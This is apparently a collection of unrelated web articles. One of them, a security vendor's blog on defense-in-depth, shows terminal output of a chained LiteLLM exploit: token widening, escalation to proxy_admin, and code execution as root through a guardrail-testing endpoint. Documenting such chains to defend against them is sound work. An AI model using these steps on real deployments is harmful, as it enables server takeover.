recovery across the entire environment. The big picture: Shifting storage to an active defender The ultimate objective of active defender is clear: moving away from the outdated, reactive mindset of passive recovery and stepping boldly into the new era of active cyber resilience. True resilience means your data infrastructure is no longer just waiting to be attacked. By protecting data natively at the storage layer, seamlessly feeding intelligence into your security operations, providing fast, native recovery and partnering deeply with the industry’s data protection leaders, Everpure helps you confidently pinpoint clean recovery points and restore operations at scale. That’s how we turn storage from a target into an active defender. Turn Storage into an Active Defender See how the Everpure platform defends your data, detects threats, and helps you recover in minutes with built-in security, connected threat detection, and dynamic response and recovery. Explore Everpure Cyber Resilience

title: Best online drawing classes for kids: what to look for and where to start
summary: Compare online drawing class types for kids: guided drawing, anime, digital art, realistic sketching. Learn what to look for and where to find live classes with real teacher feedback.
body_text: Drawing is one of those skills that looks simple until you try to teach it. A kid who draws for fun will improve on their own up to a point, but there's a ceiling. Learning to see shapes, understand proportion, work with shading, and build composition requires someone who can look at what your kid is doing and say "here's what to try next." That's what separates a good drawing class from a how-to-draw YouTube video. This guide covers the types of online drawing classes available for kids, what to look for, how the options compare, and how Outschool fits. Types of online drawing classes for kids Drawing classes aren't one-size-fits-all. The right class depends on what your kid wants to draw, how old they are, and whether they want structured instruction or creative freedom. Guided/directed drawing The teacher walks kids through drawing a specific subject step by step: an animal, a character, a landscape. These classes work well for younger kids (ages 5-8) who need structure and enjoy the satisfaction of a finished piece. The risk is that some classes are so rigid they don't build independent skills. The best ones use the guided drawing as a starting point, then encourage kids to make it their own. Anime and manga drawing Consistently one of the most popular categories for kids ages 9 and up. Good anime classes teach proportion, facial expressions, dynamic poses, and character design, not just copying existing characters. The technical skills transfer to other drawing styles. Browse anime art classes . Digital drawing and illustration Kids learn to draw using tablets, Procreate, or other digital tools. These classes combine traditional drawing fundamentals (line, shape, shading) with digital-specific skills (layers, brushes, color tools). Typically best for ages 10 and up, and the kid needs access to a drawing tablet or iPad. Browse digital art classes . Realistic drawing and sketching Focused on observational drawing: still life, portraits, landscapes. These classes teach kids to see like an artist, breaking subjects into basic shapes, understanding light and shadow, and developing patience with detail work. Best for ages 11 and up, though some classes adapt these concepts for younger kids. Cartooning and character design Kids learn to create original characters, develop visual storytelling, and build consistency in their character designs. This category bridges drawing skills and narrative thinking, which makes it a strong fit for kids who love both art and writing. What to look for in an online drawing class A teacher who can give individual feedback. Drawing is a skill that improves through targeted feedback on specific work. If a class has 30 kids and the teacher can't look at each kid's drawing during the session, the value drops significantly. Look for small class sizes (under 10). Live instruction, not just recordings. Recorded tutorials are fine for basics, but they can't adjust when a kid is struggling with a specific concept. A live teacher can demonstrate on camera, look at a kid's work through screen share, and explain the fix in real time. Skill progression, not just projects. A good class builds skills session over session: proportion leads to shading, shading leads to composition. Watch for classes that offer multi-week series or clubs where kids develop over time, not one-offs that start from scratch every session. Balance of technique and creativity. The best drawing teachers give kids enough structure to learn new skills, then enough freedom to apply those skills to subjects they care about. Too much structure kills motivation; too little structure means kids plateau. Materials guidance. A good class specifies what the kid needs before the first session: paper type, pencil grades, specific supplies. Vague materials lists ("bring something to draw with") often signal a less structured class. How the options compare YouTube tutorials (Art for Kids Hub, Draw So Cute, others). Free and abundant. Good for casual drawing at home. The limitation: no feedback, no accountability, and kids tend to copy rather than develop independent skills. Useful as a supplement, not a replacement for instruction. Self-paced apps (Skillshare Kids, Sparketh). Pre-recorded video courses organized by skill level. Sparketh is designed specifically for kids and homeschoolers, with a library of ~1,000 video lessons ($15-$25/month subscription). Good for self-motivated kids who will practice independently. No live feedback. In-person classes and camps. Local art studios and community centers offer drawing classes, typically $150-$300 for a multi-week session. Quality depends entirely on the individual instructor. Limited by geography and scheduling. Live online classes (Outschool). Outschool's drawing classes are taught live by vetted teachers in small groups averaging 3-4 kids. Classes cover every category above: guided drawing for young kids, anime and manga, digital illustration, realistic sketching, and cartooning. Teachers give real-time feedback during class. Most classes run $12-$25 per session with no subscription. Kids can try a single session or join ongoing clubs for skill progression.

title: Introducing the AI-Assisted SDK App Migration Toolkit for BlackBerry Dynamics
summary: The new AI-assisted SDK toolkit for BlackBerry Dynamics automates the migration of existing native iOS and Android apps into the Dynamics secure container.
body_text: Introducing the AI-Assisted SDK App Migration Toolkit for BlackBerry Dynamics The new toolkit automates the migration of existing native iOS and Android apps into the BlackBerry Dynamics secure container in hours — not months. Aug 6, 2026 · Blog · Baldeep Dogra Every enterprise we talk to has the same gap: a portfolio of mobile apps their business runs on, or needs to run on, and a security mandate those apps weren't built for resulting in a standard approach; ‘rebuild them inside a secure framework’ which then costs months of engineering per app, per platform. So, the apps stay outside the perimeter, and the risk stays on the books. Today we're closing that gap. The new AI-assisted SDK toolkit for BlackBerry ® Dynamics ™ automates the migration of existing native iOS ® and Android ™ apps into the Dynamics secure container. No rebuild. No re-platforming. Your apps, yes, the ones you've already invested in, gain app-level cryptographic security in days instead of months. Why App-Level Security? Most mobile security strategies protect the device: if the phone is trusted, the apps on it are trusted. That model breaks the moment a device is lost, compromised, or simply unmanaged such as in a BYOD deployment. The BlackBerry Dynamics container works differently. Each app individually encrypts its own data, its own storage, and its own connections back to your systems. Protection travels with the app, not the device. If the device is compromised, the data inside the container stays cryptographically sealed. It's the difference between locking the building and locking every safe inside it. That's why BlackBerry Dynamics has long been the choice of governments, defense agencies, banks, and healthcare systems. The barrier was never the security; it was the engineering effort to get an existing app inside the container. That's the barrier this toolkit removes. What the Toolkit Does Automated migration: The toolkit's AI engine analyzes your existing native iOS or Android codebase and automates the SDK integration work; the mapping, rewiring, and configuration that engineers previously did by hand over weeks. Full container security: Migrated apps run inside the BlackBerry Dynamics container with app-level encryption, secure storage, and secure connectivity; the same protections trusted by the most heavily regulated organizations in the world. No rebuild: You keep your codebase, your build pipeline, and your roadmap. The toolkit adapts what exists rather than demanding a rewrite. Faster for partners: Development partners and ISVs can bring their apps into the BlackBerry ecosystem dramatically faster; which means a broader catalog of secured apps for every customer. What This Means for Your Business The business case is immediate. Apps that have waited in the containerization backlog for quarters can be secured this quarter, shrinking mobile risk at a pace that used to be impossible. And because migration is now measured in days rather than months, the economics change entirely; securing an app no longer competes with building new features for the same engineering budget. Compliance gets simpler too: app-level encryption gives auditors a clean, provable answer to data-at-rest and data-in-transit questions on mobile, per app and independent of device posture. Best of all, this isn't a point fix. The toolkit is part of the same platform advancing post-quantum cryptography and sovereign endpoint control across BlackBerry UEM and BlackBerry Dynamics; security that stays ahead of the threat curve, not behind it. Under the Hood Developers would be keen to understand the migration workflow; this is what it looks like. Analyze: The toolkit statically analyzes your app; entry points, storage calls, network layers, IPC surfaces, and produces a migration map of every integration point the BlackBerry Dynamics SDK needs to touch. Transform: The AI engine applies the integration: swapping storage and networking calls for their secure BlackBerry Dynamics equivalents, wiring up authentication and container lifecycle handling, and updating build configuration for both platforms. Review: You get a full report of every change, flagged edge cases that need human review, and a diff you can inspect before anything ships. The toolkit assists; your engineers stay in control. Validate and ship: Build, run your test suite, and validate in the container. Apps deploy through BlackBerry UEM like any BlackBerry Dynamics app, with full policy and lifecycle management. The output is a native BlackBerry Dynamics integration; full SDK API access, not a binary wrapper. That distinction matters: you can extend the integration, call BlackBerry Dynamics services directly (secure storage, secure communication, shared services), and stay aligned with the SDK release train, including the platform's progress toward FIPS 140-3 and post-quantum accreditation. We're publishing the supported frameworks and current limitations openly in the developer docs; including the cases where the AI flags work for human hands. We'd rather you know exactly what to expect on app one. Get updates about the latest in-depth knowledge for secure communications.

title: Defense-in-Depth in Action: How to Stop the LiteLLM Chain (CVE-2026-47101, CVE-2026-47102, CVE-2026-40217) with Panache
summary: See Defense-in-Depth in action as Miggo stops a chained LiteLLM attack spanning authorization bypass, privilege escalation, and RCE.
body_text: This is an image I’ve sent to our devops team a few times now. I’ve got it stored in my clipboard history for future use. In this case, it was because of two three four LiteLLM vulnerabilities that were published . They were all uniquely interesting: An authorization bypass, a privilege escalation, and two RCEs. Impressive indeed! Obsidian Security’s writeup above does a great job of walking through the vulnerabilities themselves. This blog will do a very speedy run over the impact of three of them and how they can be chained - for the rest, you should go read it! Kudos to them. What I want to do with you today is: From hello to RCE Talk about defense in depth as security practitioners, and show how it fits here Show a demo we’ve made of Miggo handling this case Go on a soapbox about the state of security in general Let’s go! From hello to RCE I’ll let the script talk: # talk to litellm with a strong token to mint a low-privilege one ❯ uv run ./mint_token.py TOKEN=sk-gcxl2-gOCv_HE5hYCgSKug USER_ID=574b1713-015c-44b6-aaa0-9ecfae0f1d5a # run all three vulns in a chain ❯ ./chain.sh sk-gcxl2-gOCv_HE5hYCgSKug [ 47101 ] widen POST /key/generate { allowed_routes :[ /*]} patched/blocked -> continuing with supplied token [47102] escalate POST /user/update user_role=proxy_admin (user 574b1713-015c-44b6-aaa0-9ecfae0f1d5a) /user/list -> 200 (200 = admin) [40217] rce POST /guardrails/test_custom_code (id > /tmp/litellm-rce) RCE OK ❯ k exec litellm -- cat /tmp/litellm-rce uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) We’ve got: 47101: A weak token with limited access is widened to have access to additional paths 47102: This stronger token is still low-privileges - so we exchange it for an admin! 40217: We use the admin token to run an RCE Post-auth low-privilege -> RCE. Very cool. Defense-in-Depth Approach There’s a tendency in the wider security and technical community to give a stink eye whenever a vulnerability is published. I’ve seen sentiments like: It’s just an info leak, who cares? A local privilege escalation doesn’t matter because an attacker with access to the system can already do whatever they want A 1-click RCE can never be exploited, who’s dumb enough to fall for a “click me” link that’s sent over SMS? Oh, this requires authentication, so it’s not a real vulnerability The last one is what caught my attention. I’ve seen it said in response to the LiteLLM vulnerabilities above. It bugged me. There’s some truth to downplaying some vulnerabilities: They sit on multiple spectrums of danger and impact, that’s why CVSS has scoring vectors, exploitability is an important factor, so on and so forth. But as a researcher (and more recently, someone who cares about the security of my org), I’ve had mixed feelings about these sentiments. Aside from being gatekeeper-ish (“oh you’re a security researcher? Name every vulnerability”) they also discount the threat model : How does my environment behave, and how can an attacker affect it? Our threat model is different from yours. We’re a B2B SaaS running on a cloud, we’ve got applications that are purposefully open to the wider internet, alongside processes that go out and collect data. We’ve got sensors running in customer environments. We’ve got our CI/CD pipelines and our internal software stacks. Crucially, we give some of our partners access to some of our systems that can be considered internal - one of them being LiteLLM. Is a post-auth attack on LiteLLM part of our threat model? It’s not at the top of my list, but it’s up there. I hope our partners won’t lose our tokens and won’t be affected by supply chain attacks, but I can never be sure, so yes, I care about post-auth attacks on LiteLLM . Another org, which only deploys LiteLLM internally behind seven VPNs - maybe they don’t care as much. That’s fair. What I really like about the chain above is how…chainie it is. Let’s take the RCE and put it behind a high-privilege endpoint - it’s not too interesting. But chaining lower-impact vulnerabilities into a larger one is so often the game in security. If this interests you, look at some pwn2own writeups for the juicy details - they’re wonderful in the scary sense. Defense in depth comes from examining the threat model and how an attacker can get in, assuming they broke down whatever barriers they had until now, and figuring out how to stop them from getting another inch. Every vulnerability that you stack in front of another makes it so much harder to actually exploit and pull off. What does this have to do with protecting my organization? Bringing us back to a threat model, there are two wider areas that interest us internally as well as showing up in pretty much every customer conversation. The industry is really afraid of: Just-released vulnerabilities that are getting sprayed: think React2Shell or Shellshock, those lovelies that show up in your access log Zero days in 1st and 3rd party code: think MoveIT before Cl0p announced that they hacked everyone When these vulnerabilities dropped, we saw how Miggo’s Defense-in-Depth solution could help on both counts: With the WAF copilot, customers use their existing security tooling to create rules for the privilege escalation. Once you know what to look for, it’s easily to block this attempt specifically while keeping regular traffic With the Miggo sensor, customers can both know and block the code execution, even before a CVE is released This gives us two great points for Defense-in-Depth: Protect against what’s known while preparing for the worst. This has been very courteous and nice so far, but I feel like there’s a growing feeling of frustration. No offense to this dev team or any other, writing software is hard, but I look at these vulnerabilities and just go… HOW!? How are we still doing this? How are we dealing with “how”-worthy sql injections when we’ve had prepared statements in php over 20 years now (remember mysqli_real_escape_string ?) How do we still have trivial XSSs in popular applications ? We’ve had cure53 teaching us how to do this since like 2012. How are we still getting trivial command injections that any security scanner written after 2010 should pick up? Now we’re adding to the mix a trend of local privilege escalations . It’s not that it was never this bad - remember when SSTIs dropped? Remember the before/after split of SQL injections!? The internet was suddenly open season. It was bad. But it feels like we should be getting better . We’ll always have bugs, sure. If you get a 10 page writeup by watchTowr (alongside a handsome demo by Miggo ) that’s one thing. Mistakes happen, we sometimes forget to sync up our arrays , oopsies. But the past two years felt…more. If beforehand we went around a house in shambles and were afraid that opening a door would leave us holding a doorknob, I’m now afraid that opening the rickety shed door will destabilise the integrity of the entire house and the neighbourhood and the Eurasian tectonic plate. This isn’t quite the note that I want to end this piece on - not all is doom and gloom - but it sometimes feels like ugh . (Pictured: Artax is me, the swamp is the security landscape, and I guess Atreyu is fruit loops?) Until salvation or doom takes us all, here’s what I’m planning on doing: Implementing secure-by-default and defense-in-depth (which includes Miggo) Pushing for better security education - both defenders and individual researchers Limiting dependencies on 3rd parties Got anything else that doesn’t involve even more fruit loops? Let us know . title: AI in Property Estimating Workflows: Moving from Exploration to Adoption
summary: Learn how claims, estimating, and restoration teams can start using AI to reduce manual effort and improve workflow productivity.
body_text: In our first article in this series, AI in Estimating and Claims Workflows: Where Efficiency Begins , we explored how AI can reduce manual effort and help industry professionals move more efficiently through everyday claims and estimating workflows. Property claims, estimating, and restoration teams are being asked to manage more work, move faster, and maintain quality. That creates the opportunity to reduce routine work related to important decisions, so professionals can spend more time where their judgement creates the most value. Identifying these use cases is only the first step—carriers, contractors, and other organizations across the property claims ecosystem need to implement AI tools in a practical way. Adopting AI does not have to begin as a major transformation initiative. It can start with practical, focused use cases that reduce friction in workflows teams already understand. The gap between experimenting with AI and creating value Piloting an AI tool may be simple, but turning it into a useful, trustworthy part of everyday work is more challenging. Organizations may introduce general tools without clearly defining expected outcomes. Employees may be asked to change or duplicate established workflows to pressure test. Adoption tends to stall for reasons that have little to do with technology itself: No defined problem. Organizations introduce general tools without a clear job to do or expected outcomes. Workflow disruption. Users are asked to leave familiar systems and re-enter information into new or multiple tools. Lack of trust. Validating outputs from AI tools requires additional time and work. The fix isn’t a bigger initiative, but rather a narrower starting point: addressing a specific source of workflow friction. Start with work your teams already understand To identify initial AI use cases, look for tasks that people perform frequently, take time to complete, and deliver outputs that an experienced professional can review quickly. In claims and restoration workflows, such tasks include: Organizing and labeling photos Creating property sketches Surfacing relevant estimate information Summarizing assignment activity None of these sound like transformation projects, and that’s the point. When AI reduces the time spent on a routine task someone already does today, the impact is immediate and tangible that drives further adoption and deeper engagement with AI solutions. Recent feedback from XactAI™ users reinforces this pattern. Photo labeling and descriptions, along with Sketch Scan, stood out as areas of practical interest and use. Both replace clearly defined manual steps while keeping the professional in control of the result. AI should strengthen human claims expertise, not replace it Effective adoption isn’t about removing people from the process. Instead, it’s about giving them a better starting point. Instead of labeling every photo individually, you review suggested labels. Instead of building a sketch from scratch, you validate and adjust a generated one. Instead of searching across notes and activity, you start from a summarized view. In every case, the professional still applies judgment, checks the information, and makes the call. What changes is the amount of time and resources that facilitate that decision. Connected data makes each decision easier The value compounds when AI works across the full picture rather than one isolated task. When capabilities span line items, sketches, rebuild requirements, pricing, and broader business trends, they stop being separate features and start functioning as a connected claims ecosystem, where each input makes the next decision more informed. Begin with one problem and build from there You don’t need to solve every AI use case at once. A practical path: Identify one recurring source of manual effort. Introduce an AI capability within that existing workflow. Measure whether it saves time or improves consistency. Expand into adjacent work once users trust the output. XactAI supports this approach by bringing AI-powered capabilities into the Xactware® suite of products your teams already use. From photo labeling and sketching to assignment summaries, line-item guidance, pricing, and business insights, you can start with the capability that addresses your most immediate need. AI transformation may be the long-term destination. Meaningful adoption starts by making today’s work easier.

title: Tilray Medical Welcomes Progress in Germany’s Medical Cannabis Framework and Supports Continued Policy Development
summary: As a global medical cannabis leader, Tilray Medical supports continued policy development that strengthens physician confidence, protects patient access and provides a clear, sustainable framework for medical cannabis in Germany. The guidance issued by the KBV and GKV-Spitzenverband represents an
body_text: As a global medical cannabis leader, Tilray Medical supports continued policy development that strengthens physician confidence, protects patient access and provides a clear, sustainable framework for medical cannabis in Germany. The guidance issued by the KBV and GKV-Spitzenverband represents an important step forward by providing greater practical direction for the prescribing of standardized full-spectrum cannabis extracts. Tilray Medical welcomes this progress and encourages policymakers to build upon it with legislative clarity that provides physicians, patients, healthcare providers and payers with a consistent and durable framework for medical cannabis care. DENSBORN, Germany, Aug. 18, 2026 (GLOBE NEWSWIRE) -- Tilray Medical , a global leader in medical cannabis research, cultivation, production, products and distribution and a division of Tilray Brands, Inc. (“Tilray”) (Nasdaq: TLRY; TSX: TLRY), considers the recent guidance issued by the National Association of Statutory Health Insurance Physicians (KBV) and the National Association of Statutory Health Insurance Funds (GKV-Spitzenverband) on the prescription of medical cannabis in the form of standardized full-spectrum extracts a step in the right direction. Important legal and regulatory questions nevertheless remain unresolved under Germany’s revised framework for reimbursed medical cannabis prescribing. Durable legal certainty for physicians, patients, healthcare providers and payers will ultimately require legislative clarification. Rajnish Ohri, President, International, Tilray Brands, said, “The guidance represents meaningful progress and provides valuable direction for healthcare professionals navigating medical cannabis prescribing. Continued legislative clarity will help strengthen confidence in the framework and support long-term stability for patients, physicians and healthcare providers.” Practical Clarity from the KBV and GKV-Spitzenverband Guidance The current interpretation issued by the KBV and the GKV-Spitzenverband provides important practical clarity for healthcare professionals and patients. It represents a constructive step toward safeguarding patient access to treatment and creating a more predictable prescribing framework. Mr. Ohri, added, “Germany continues to set an important example for medical cannabis in Europe by advancing a thoughtful, science-based framework that puts patients and physicians at the center of care. Tilray Medical is committed to working with physicians, regulators and industry partners to help strengthen confidence in Germany’s medical cannabis system and ensure patients have access to the therapies that best meet their needs.” Remaining Legal and Regulatory Questions First, physicians require greater certainty regarding the appropriate use of cannabis-based therapies, including standardized full-spectrum extracts and other magistral preparations. Practical guidance and access to a broad range of pharmaceutical-quality cannabis medicines remain essential to ensuring that treatment decisions are driven by clinical need and patient outcomes. The principle that finished medicinal products should be trialed only within their approved indication, and that ineffective or poorly tolerated therapies should not be unnecessarily prolonged, supports sound medical practice and protects physician autonomy. Second, continuity of care must remain a priority for patients already benefiting from cannabis-based treatment. Patients stabilized on standardized full-spectrum extracts or other magistral preparations should be protected from avoidable treatment disruptions. Regulatory certainty is necessary so that therapeutic decisions remain focused on individual patient needs. Administrative uncertainty should not determine the course of a treatment. Third, as reimbursement rules continue to evolve, all stakeholders would benefit from greater predictability regarding treatment pathways and reimbursement eligibility. Patients, physicians, health insurers and healthcare providers need a stable statutory framework that supports responsible access and consistent implementation throughout the healthcare system. The Case for Legislative Clarification Tilray Medical supports a clear statutory framework that protects physicians’ freedom of therapy and safeguards continuity of care for existing patients. Such a framework would also provide greater predictability regarding reimbursement and treatment pathways. Codifying these principles in legislation would reduce implementation uncertainty and ensure sustainable patient access to appropriate therapies. Mr. Ohri, continued, “The current guidance represents meaningful progress. Building on this progress through additional legislative clarity and codifying this interpretation in law would preserve physicians’ freedom of therapy and maintain a predictable reimbursement framework. It would also give patients, healthcare providers and health insurers the long-term planning reliability they need.” Strengthening Physician Decision-Making Tilray Medical believes physicians need practical guidance and access to a broad range of pharmaceutical-quality cannabis medicines. The clarification that finished medicinal products should be trialed only within their approved indication, and that ineffective or poorly tolerated treatments should not be prolonged, supports sound clinical judgment and helps avoid unnecessary disruption for patients already stable on standardized full-spectrum extracts or other magistral preparations. Supporting a Responsible Transition for Patients With reimbursement changes affecting cannabis flower, patients should have timely access to appropriate alternatives, including standardized full-spectrum extracts. Through its cultivation, manufacturing and distribution operations in Germany, supported by its global medical cannabis platform and quality standards, Tilray Medical is well positioned to support the market responsibly while helping ensure reliable access for patients and healthcare providers. Supporting Germany Through a Reliable Medical Cannabis Platform Tilray Medical supports continued collaboration among policymakers, physicians, regulators and industry leaders as Germany advances its medical cannabis system. With international scale, a broad product portfolio and deep operating experience, Tilray Medical is well positioned to help shape the next phase of responsible cannabis care in Germany and across Europe. Tilray Medical’s presence in Germany reflects years of investment in a reliable, integrated medical cannabis platform. The Company holds a leading position in Germany’s medical cannabis oil market, with 45% market share, supported by cultivation and manufacturing capabilities in Germany and Portugal, including its Aphria RX facility and the ARX brand developed for German patients. Through CC Pharma, Tilray also reaches approximately 16,000 pharmacies and major wholesalers, helping support access to high-quality medical cannabis products for physicians and patients across Germany. With this foundation in Germany, Tilray Medical is helping define a more reliable, physician-led path for medical cannabis care.
